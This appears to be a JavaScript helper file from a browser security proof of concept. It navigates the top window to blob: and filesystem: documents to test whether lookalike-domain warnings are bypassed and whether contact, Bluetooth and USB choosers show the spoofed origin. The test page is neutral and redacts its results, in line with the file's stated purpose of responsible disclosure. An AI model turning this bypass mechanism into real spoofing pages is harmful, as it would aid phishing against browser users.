/*
 * Shared helpers for the lookalike scheme-bypass mechanism PoC.
 * Authorized security research / responsible disclosure ONLY.
 * The "landed" page is intentionally NEUTRAL — it must not impersonate any brand.
 */

// The page we navigate the top window to (as a blob:/filesystem: document).
// It self-reports its scheme/origin and offers the permission-prompt chain (#3),
// so you can see whether a chooser launched here shows the (lookalike) origin.
function buildLandedHtml() {
  return [
    '<!doctype html><html lang="en"><head><meta charset="utf-8">',
    '<meta name="viewport" content="width=device-width,initial-scale=1">',
    '<title>Scheme Bypass Test</title>',
    '<style>',
    'body{font:16px/1.5 system-ui,sans-serif;margin:0;padding:1rem}',
    '.banner{background:#b3261e;color:#fff;padding:.8rem;border-radius:8px;font-weight:700}',
    'code{word-break:break-all;background:#8882;padding:.1rem .3rem;border-radius:3px}',
    'button{font:600 16px system-ui;padding:.8rem;width:100%;margin-top:.5rem;border-radius:8px;cursor:pointer}',
    'pre{white-space:pre-wrap;word-break:break-word;background:#8881;padding:.6rem;border-radius:6px}',
    '</style></head><body>',
    '<div class="banner">SCHEME-BYPASS TEST PAGE — research only, not impersonating any brand</div>',
    '<p>If the URL bar shows a <b>lookalike domain</b> here with <b>no "Did you mean…" warning</b>, the lookalike throttle was bypassed for this scheme.</p>',
    '<div>href: <code id="h"></code></div>',
    '<div>origin: <code id="o"></code></div>',
    '<p style="margin-top:1rem">Permission-prompt chain — does the dialog show <em>this</em> origin?</p>',
    '<button id="c">Open Contact Picker</button>',
    '<button id="bt">Open Bluetooth chooser</button>',
    '<button id="u">Open USB chooser</button>',
    '<pre id="l"></pre>',
    '<script>',
    '(function(){',
    '  function $(id){return document.getElementById(id);}',
    '  $("h").textContent=location.href;$("o").textContent=location.origin;',
    '  function log(m){$("l").textContent=m+"\\n"+$("l").textContent;}',
    '  function bind(id,fn){var e=$(id);if(e){e.addEventListener("click",fn);}}',
    '  bind("c",async function(){try{if(!(navigator.contacts&&navigator.contacts.select)){log("contacts N/A here");return;}var r=await navigator.contacts.select(["name","email"],{multiple:true});log("contacts -> "+r.length+" contact(s) (redacted)");}catch(e){log("contacts: "+e.name+": "+e.message);}});',
    '  bind("bt",async function(){try{if(!(navigator.bluetooth&&navigator.bluetooth.requestDevice)){log("bluetooth N/A here");return;}await navigator.bluetooth.requestDevice({acceptAllDevices:true});log("bluetooth -> device selected (redacted)");}catch(e){log("bluetooth: "+e.name+": "+e.message);}});',
    '  bind("u",async function(){try{if(!(navigator.usb&&navigator.usb.requestDevice)){log("usb N/A here");return;}await navigator.usb.requestDevice({filters:[]});log("usb -> device selected (redacted)");}catch(e){log("usb: "+e.name+": "+e.message);}});',
    '})();',
    '</script></body></html>'
  ].join('');
}

// #1/#2: navigate `targetWindow` to a blob: document built in THIS frame's origin.
function navViaBlob(targetWindow) {
  var url = URL.createObjectURL(new Blob([buildLandedHtml()], { type: 'text/html' }));
  targetWindow.location.href = url;
  return url;
}

// #1 sibling: same, but via the filesystem: scheme (Chrome-only, deprecated API).
// Whether top-level navigation to filesystem: is permitted is exactly what we test.
function navViaFilesystem(targetWindow, onResult) {
  var req = window.requestFileSystem || window.webkitRequestFileSystem;
  if (!req) { onResult('filesystem: API unavailable in this browser'); return; }
  req(window.TEMPORARY, 5 * 1024 * 1024, function (fs) {
    fs.root.getFile('bypass-test.html', { create: true }, function (entry) {
      entry.createWriter(function (writer) {
        writer.onwriteend = function () {
          var url = entry.toURL();
          onResult('filesystem URL built: ' + url);
          try { targetWindow.location.href = url; }
          catch (e) { onResult('top-nav to filesystem blocked: ' + e.message); }
        };
        writer.onerror = function (e) { onResult('write error: ' + e); };
        writer.write(new Blob([buildLandedHtml()], { type: 'text/html' }));
      }, function (e) { onResult('createWriter error: ' + (e && e.name)); });
    }, function (e) { onResult('getFile error: ' + (e && e.name)); });
  }, function (e) { onResult('requestFileSystem error: ' + (e && e.name)); });
}
